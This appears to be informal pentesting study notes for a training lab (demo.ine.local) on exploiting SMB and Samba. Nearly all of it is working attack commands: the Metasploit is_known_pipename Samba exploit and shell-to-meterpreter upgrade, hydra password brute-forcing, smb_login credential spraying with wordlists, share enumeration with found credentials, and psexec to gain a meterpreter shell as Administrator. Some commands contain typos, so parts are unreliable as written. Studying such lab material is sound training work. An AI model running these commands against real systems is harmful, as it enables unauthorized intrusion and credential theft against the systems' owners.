# exploiting using metasploit framework
- __`search type:exploit name:samba`__
- __`search pipename`__
```
use exploit/Linux/samba/is_know_pipename
exploit
```
ctr+z
upgrading to meterpreter session
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST ech1
set session 1
exploit
```

# Exploiting SAMBA


__1. Brup force attack on SAMBA__
- __`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 smb`__

__2. smbmap__
__`smbmap -H demo.ine.local -u admin -p password1`__
  - __It will display the user's and  permissions__

__3.smbclient__
__`smbclient //demo.ine.local/shawn -U admin`__
  - __it will connect the server like a ftp__
  - __`shawn` is a user__
  - __`-U admin` authenticate as a admin mean you can login using admin logs__

__4. enum4linux__
__`enum4linux -a -u admin -p password1`__

- __1. Target information__
- __2. Users__
- __3. SID of the users__












# SMB (Server Message Block) - 445 TCP, 139 on NetBIOS
  - __used for network file sharing, printer__
  - __SAMBA is the open source linux implementation of SMB__
- __1. We will run smb_login module to find all the valid users and their passwords.__
```
service postgresql start && msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```
## We have found four valid users and their passwords
- __2.Running psexec module to gain the meterpreter shell..__
```
service postgresql start && msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```
